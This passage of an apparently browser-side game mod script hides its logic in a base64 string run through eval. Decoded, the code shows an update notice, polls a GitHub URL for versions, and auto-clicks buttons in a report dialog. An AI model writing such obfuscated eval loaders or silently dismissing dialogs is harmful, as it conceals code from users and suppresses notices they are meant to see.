sKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwp2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwppY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwppY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7Cmljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKCi8vIFVwZGF0ZSBjbGllbnQgbWVzc2FnZQp2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwp0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CnRleHQuaW5uZXJIVE1MID0gIk5ldyB1cGRhdGUgZGV0ZWN0ZWQsIHJlZnJlc2ggQkMgdG8gdXBkYXRlIHRvIFYyLjAuNyI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7Cn0sIDApOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp9LCA1MDAwMDAwKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKfSwgNTUwMDAwMCk7Cgp9CgogIC8vIEVuZCBvZiBVcGRhdGUgVG9hc3RfX19fX19fX19fX19fX19fCgogIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKCiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CiAgICBpZiAoZWxlbWVudFRvUmVtb3ZlKSB7CiAgICAgIGNvbnN0IGJ1dHRvbnMgPSBlbGVtZW50VG9SZW1vdmUucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uW3N0eWxlPSJjdXJzb3I6IHBvaW50ZXI7Il0nKTsKICAgICAgaWYgKGJ1dHRvbnMpIHsKICAgICAgICBidXR0b25zLmZvckVhY2goYnV0dG9uID0+IGJ1dHRvbi5jbGljaygpKTsKICAgICAgfQogICAgfQogIH0sIDEpOwogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiB7CiAgICAgICAgICBpZiAoYnV0dG9uLnRleHRDb250ZW50ID09PSAiRG8gbm90IHNob3cgdGhpcyByZXBvcnQgYWdhaW4gdW5sZXNzIHNvbWV0aGluZyBjaGFuZ2VzIiB8fCBidXR0b24udGV4dENvbnRlbnQgPT09ICJDbG9zZSIpIHsKICAgICAgICAgICAgYnV0dG9uLmNsaWNrKCk7CiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgIH0KICAgIH0KICB9LCA1MDApOwoKICAvLyAgVVJMIG9mIHRoZSB1cGRhdGUgcGFnZQpjb25zdCB1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL3VwZGF0ZW1hbmFnZXIuanMnOwpjb25zdCBtYXhWZXJzaW9uID0gMTU7CmxldCBhbGVydFRyaWdnZXJlZCA9IGZhbHNlOwpmdW5jdGlvbiBjaGVja1ZlcnNpb24oKSB7CiAgZmV0Y2godXJsKQogICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgLnRoZW4odmVyc2lvbiA9PiB7CiAgICAgIGlmIChwYXJzZUludCh2ZXJzaW9uKSA+IG1heFZlcnNpb24gJiYgIWFsZXJ0VHJpZ2dlcmVkKSB7CiAgICAgICAgc2hvd1RvYXN0VXBkYXRlKCk7CiAgICAgICAgYWxlcnRUcmlnZ2VyZWQgPSB0cnVlOwogICAgICB9CiAgICB9KQogICAgLmNhdGNoKGVycm9yID0+IGNvbnNvbGUuZXJyb3IoZXJyb3IpKTsKfQovLyBDaGVjayBmb3IgdXBkYXRlcyBldmVyeSA1IHNlY29uZHMKc2V0SW50ZXJ2YWwoY2hlY2tWZXJzaW9uLCA1MDAwKTsKfQp9KQoKCg==')
if (sprc) {
eval(sprc);
}
/*
42
*/
